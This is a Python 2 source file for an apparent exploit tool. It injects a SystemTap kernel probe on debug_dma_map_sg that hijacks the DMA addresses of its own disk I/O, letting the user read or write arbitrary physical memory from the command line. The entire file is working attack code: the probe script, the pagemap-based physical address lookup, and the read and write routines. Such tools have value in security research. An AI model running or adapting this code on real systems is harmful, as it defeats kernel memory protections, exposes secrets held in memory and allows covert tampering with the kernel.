import sys, os, traceback, threading, subprocess, signal, time, shutil, struct, mmap
from optparse import OptionParser, make_option
from ctypes import *

# print more information from running SystemTap script
VERBOSE = False

# script source code
SCRIPT_CODE = '''

global data_len = 0
global verbose = ''' + ('1' if VERBOSE else '0') + '''

#
# kernel function probe handler
#
probe kernel.function("debug_dma_map_sg")
{
    # parse script arguments passed to stap
    phys_addr = strtol(@1, 16);
    target_addr = strtol(@2, 16);

    printf("%s(%d): %s(): %d\\n", execname(), pid(), probefunc(), $nents);

    #
    # Each call to sys_write() leads to corresponding call of dma_map_sg(),
    # $sg argument contains list of DMA buffers
    #
    if (verbose != 0)
    {
        for (i = 0; i < $nents; i++)
        {
            printf(" #%d (0x%x): 0x%x\\n", i, $sg[i]->length, $sg[i]->dma_address);
        }
    }    

    # check for data that came from dma_expl.py os.write() call
    if ($nents > 0 && $sg[0]->dma_address == phys_addr)
    {
        printf("[+] DMA request found, changing address to 0x%x\\n", target_addr + data_len);

        # replace addresses of DMA buffers
        for (i = 0; i < $nents; i++)
        {
            $sg[i]->dma_address = target_addr + data_len;
            data_len += $sg[i]->length;    
        }
    }
}

'''

SCRIPT_PATH = '/tmp/dma_expl.stp'
TEMP_PATH = '/tmp/dma_expl.tmp'

PAGE_SIZE = 0x1000

class Worker(threading.Thread):

    def __init__(self, phys_addr, target_addr):

        super(Worker, self).__init__()

        self.daemon = True
        self.started = True
        self.count = 0

        # drop script file into the /tmp
        self.create_file()

        # run SystemTap script
        self.p = subprocess.Popen([ 'stap', '-g', '-v', SCRIPT_PATH,
                                  hex(phys_addr), hex(target_addr) ],
                                  stdout = subprocess.PIPE, stderr = subprocess.PIPE)

        # wait for script initialization
        while self.started:

            line = self.p.stderr.readline()
            sys.stdout.write(line)

            if line == '':

                break

            # check for pass 5 that indicates sucessfully loaded script
            elif line.find('Pass 5') == 0:

                print '[+] SystemTap script started'
                break

    def create_file(self):

        # save script contents into the file
        with open(SCRIPT_PATH, 'wb') as fd:

            fd.write(SCRIPT_CODE)

    def run(self):

        while self.started:

            # read and print script output
            line = self.p.stdout.readline()

            if VERBOSE:

                sys.stdout.write(line)

            if line == '':

                self.started = False
                break

            # check for hijacked DMA request
            elif line.find('[+]') == 0:

                self.count += 1

    def start(self):

        super(Worker, self).start()

        # delay after script start
        time.sleep(1)

    def stop(self):

        if self.started:

            # delay before sript shutdown
            time.sleep(3)

            self.started = False
            os.kill(self.p.pid, signal.SIGINT)

class PyObj(Structure):

    _fields_ = [("ob_refcnt", c_size_t),
                ("ob_type", c_void_p)]

class PyVarObj(PyObj):

    _fields_ = [("ob_size", c_size_t)]

# ctypes object for introspection
class PyMmap(PyObj):

    _fields_ = [("ob_addr", c_size_t)]

# class that inherits mmap.mmap and has the page address
class MyMap(mmap.mmap):

    def __init__(self, *args, **kwarg):

        # get the page address by introspection of the native structure
        m = PyMmap.from_address(id(self))
        self.addr = m.ob_addr

class DmaExpl(object):

    MAX_IO_SIZE = PAGE_SIZE * 0x1E

    def __init__(self, target_addr):

        if target_addr & (PAGE_SIZE - 1) != 0:

            raise Exception('Address must be aligned by 0x%x' % PAGE_SIZE)

        self.phys_addr = 0
        self.target_addr = target_addr

        self.libc = cdll.LoadLibrary("libc.so.6")

        # allocate dummy data buffer
        self.buff = MyMap(-1, self.MAX_IO_SIZE, mmap.PROT_WRITE) 
        self.buff.write('\x41' * self.MAX_IO_SIZE)

        print '[+] Memory allocated at 0x%x' % self.buff.addr

        with open('/proc/self/pagemap', 'rb') as fd:

            # read physical address information
            fd.seek(self.buff.addr / PAGE_SIZE * 8)
            phys_info = struct.unpack('Q', fd.read(8))[0]

            # check that page is mapped and not swapped
            if phys_info & (1L << 63) == 0:

                raise Exception('Page is not present')

            if phys_info & (1L << 62) != 0:

                raise Exception('Page is swapped out')

            # get physical address from PFN
            self.phys_addr = (phys_info & ((1L << 54) - 1)) * PAGE_SIZE

            print '[+] Physical address is 0x%x' % self.phys_addr

        # run SystemTap script in background thread
        self.worker = Worker(self.phys_addr, target_addr)
        self.worker.start()

    def _dma_read(self, read_size):              

        count = self.worker.count

        print '[+] Reading physical memory 0x%x - 0x%x' % \
              (self.target_addr, self.target_addr + read_size - 1)        

        # O_DIRECT is needed to write our data to disk immediately
        fd = os.open(TEMP_PATH, os.O_CREAT | os.O_TRUNC | os.O_RDWR | os.O_DIRECT)

        # initiate DMA transaction
        if self.libc.write(fd, c_void_p(self.buff.addr), read_size) == -1:

            os.close(fd)
            raise Exception("write() fails")

        os.close(fd)

        while self.worker.count == count:

            # wait untill intercepted debug_dma_map_sg() call
            time.sleep(0.1)

        with open(TEMP_PATH, 'rb') as fd:

            # get readed data
            data = fd.read(read_size)

        os.unlink(TEMP_PATH)

        self.target_addr += read_size

        return data

    def read(self, read_size):

        data = ''

        if read_size < PAGE_SIZE or read_size % PAGE_SIZE != 0:

            raise Exception('Invalid read size')

        while read_size > 0:

            # we can read only MAX_IO_SIZE bytes of physical memory with each os.write() call
            size = min(read_size, self.MAX_IO_SIZE)
            data += self._dma_read(size)

            read_size -= size

        print '[+] DONE'

        return data

    def _dma_write(self, data):

        count = self.worker.count
        write_size = len(data)

        print '[+] Writing physical memory 0x%x - 0x%x' % \
              (self.target_addr, self.target_addr + write_size - 1)        

        with open(TEMP_PATH, 'wb') as fd:

            # get readed data
            fd.write(data)

        # O_DIRECT is needed to write our data to disk immediately
        fd = os.open(TEMP_PATH, os.O_RDONLY | os.O_DIRECT)

        # initiate DMA transaction
        if self.libc.read(fd, c_void_p(self.buff.addr), write_size) == -1:

            os.close(fd)
            raise Exception("read() fails")

        os.close(fd)

        while self.worker.count == count:

            # wait untill intercepted debug_dma_map_sg() call
            time.sleep(0.1)

        os.unlink(TEMP_PATH)

        self.target_addr += write_size

    def write(self, data):

        ptr = 0
        write_size = len(data)

        if write_size < PAGE_SIZE or write_size % PAGE_SIZE != 0:

            raise Exception('Invalid write size')        

        while ptr < write_size:

            # we can write only MAX_IO_SIZE bytes of physical memory with each os.read() call
            self._dma_write(data[ptr : ptr + self.MAX_IO_SIZE])
            ptr += self.MAX_IO_SIZE

        print '[+] DONE'

    def close(self):

        self.worker.stop()

def hexdump(data, width = 16, addr = 0):

    ret = ''

    def quoted(data):

        # replace non-alphanumeric characters
        return ''.join(map(lambda b: b if b.isalnum() else '.', data))

    while data:

        line = data[: width]
        data = data[width :]

        # put hex values
        s = map(lambda b: '%.2x' % ord(b), line)
        s += [ '  ' ] * (width - len(line))

        # put ASCII values
        s = '%s | %s' % (' '.join(s), quoted(line))

        if addr is not None: 

            # put address
            s = '%.8x: %s' % (addr, s)
            addr += len(line)

        ret += s + '\n'

    return ret

def main():

    option_list = [

        make_option('-r', '--read', dest = 'read', default = None,
            help = 'read physical memory'),

        make_option('-w', '--write', dest = 'write', default = None,
            help = 'write physical memory'),

        make_option('-s', '--size', dest = 'size', default = None,
            help = 'read/write size'),

        make_option('-f', '--file', dest = 'file', default = None,
            help = 'read/write file path')
    ]

    parser = OptionParser(option_list = option_list)
    (options, args) = parser.parse_args()

    if options.read is not None:

        data = None
        addr = int(options.read, 16)
        size = int(options.size, 16) if options.size is not None else PAGE_SIZE        

    elif options.write is not None:

        if options.file is None:

            print 'ERROR: --file must be specified'
            return -1

        with open(options.file, 'rb') as fd:

            data = fd.read()

        addr = int(options.write, 16)
        size = len(data)

    else:

        print 'ERROR: invalid arguments, try --help for help'
        return -1

    # initialize exploit
    expl = DmaExpl(addr)

    try:

        if options.write is not None:

            # perform physical memory writes
            expl.write(data)

        else:

            # perform physical memory reads
            data = expl.read(size)
        
        expl.close()

    except Exception, e:

        expl.close()
        raise

    if options.read is not None:

        if options.file is not None:

            # save readed data
            with open(options.file, 'wb') as fd:

                fd.write(data)
        else:

            # print readed data
            print hexdump(data)

    return 0

if __name__ == '__main__':

   sys.exit(main())

#
# EoF
#
